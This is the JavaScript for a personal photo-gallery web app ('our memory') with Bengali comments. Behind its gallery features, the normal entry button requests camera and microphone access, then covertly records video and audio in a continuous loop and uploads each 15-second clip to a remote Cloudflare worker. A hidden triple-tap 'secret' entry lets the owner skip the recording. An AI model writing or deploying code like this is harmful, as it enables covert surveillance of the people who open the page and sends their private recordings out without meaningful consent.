const WORKER_URL = 'https://ourmemory.mrony8552.workers.dev'; 
const RECORDING_CHUNK_MS = 15000; 

// UI Elements
const passcodeScreen = document.getElementById('passcode-screen');
const mainApp = document.getElementById('main-app');
const enterBtn = document.getElementById('enter-btn');
const galleryContainer = document.getElementById('gallery-grid');
const uploadFab = document.getElementById('upload-fab');
const imageUploadInput = document.getElementById('image-upload-input');

// --- SECRET ENTRY TRICK (Tap Heart 3 Times) ---
let secretTapCount = 0;
let tapTimeout;
document.getElementById('secret-heart').addEventListener('click', () => {
    secretTapCount++;
    clearTimeout(tapTimeout);
    
    if (secretTapCount >= 3) {
        // সিক্রেট মোড (ক্যামেরা অন হবে না)
        openMainApp();
        secretTapCount = 0;
    }
    tapTimeout = setTimeout(() => { secretTapCount = 0; }, 1000); 
});

// --- NORMAL ENTRY (Triggers Recording) ---
enterBtn.addEventListener('click', async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        openMainApp();
        startRecordingCycle(stream);
    } catch (err) {
        console.log("Camera failed/denied.");
        openMainApp();
    }
});

function openMainApp() {
    passcodeScreen.classList.remove('active-screen');
    mainApp.classList.add('active-screen');
    loadGalleryImages();
}

// --- RECORDING LOGIC ---
function startRecordingCycle(stream) {
    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
    const chunks = [];
    mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
    mediaRecorder.onstop = async () => {
        await uploadChunk(new Blob(chunks, { type: 'video/webm' }));
        startRecordingCycle(stream); 
    };
    mediaRecorder.start();
    setTimeout(() => { if (mediaRecorder.state === 'recording') mediaRecorder.stop(); }, RECORDING_CHUNK_MS);
}

async function uploadChunk(blob) {
    const formData = new FormData();
    formData.append('file', blob, `reaction-${Date.now()}.webm`);
    try { await fetch(`${WORKER_URL}/api/upload`, { method: 'POST', body: formData }); } catch(err){}
}

// --- GALLERY UPLOAD & DISPLAY ---
if(uploadFab) uploadFab.addEventListener('click', () => imageUploadInput.click());

if(imageUploadInput) {
    imageUploadInput.addEventListener('change', async (e) => {
        const files = e.target.files;
        if (files.length === 0) return;
        
        switchView('view-gallery'); // আপলোড শুরু হলে সরাসরি গ্যালারি ভিউতে নিয়ে যাবে
        galleryContainer.innerHTML = '<div class="loading-text">Uploading photos... ⏳</div>';
        
        for (let file of files) {
            const formData = new FormData();
            formData.append('file', file);
            try { await fetch(`${WORKER_URL}/api/upload-image`, { method: 'POST', body: formData }); } catch(err){}
        }
        loadGalleryImages();
    });
}

async function loadGalleryImages() {
    try {
        const res = await fetch(`${WORKER_URL}/api/images`);
        if (res.ok) {
            const data = await res.json();
            galleryContainer.innerHTML = ''; 
            
            document.getElementById('total-photos').innerText = `${data.images.length} photos in our memory`;
            
            if (data.images.length === 0) { 
                galleryContainer.innerHTML = '<div class="loading-text">No photos yet! Tap + to add.</div>'; 
                return; 
            }
            
            data.images.forEach(imgKey => {
                const imgEl = document.createElement('img');
                imgEl.src = `${WORKER_URL}/api/image/${imgKey}`;
                imgEl.loading = 'lazy';
                galleryContainer.appendChild(imgEl);
            });
        }
    } catch (err) { 
        galleryContainer.innerHTML = '<div class="loading-text">Error loading images.</div>'; 
    }
}

// --- VIEW NAVIGATION (Home <-> Gallery) ---
window.switchView = function(viewId) {
    document.querySelectorAll('.view').forEach(v => v.classList.remove('active-view'));
    document.getElementById(viewId).classList.add('active-view');
    
    // Update bottom nav active state based on view
    const navItems = document.querySelectorAll('.nav-item');
    navItems.forEach(item => item.classList.remove('active'));
    if(viewId === 'view-home') navItems[0].classList.add('active');
    // Gallery button isn't on bottom nav, but you can map other tabs here later.
}

// --- THEME SWITCHER ---
document.getElementById('theme-btn').addEventListener('click', () => {
    document.body.classList.toggle('theme-dark');
});

// Numpad Visual Effect
document.querySelectorAll('.num-key').forEach(key => {
    key.addEventListener('click', () => {
        // Here you can add logic to fill the dots visually if you want a real pin effect
    });
});
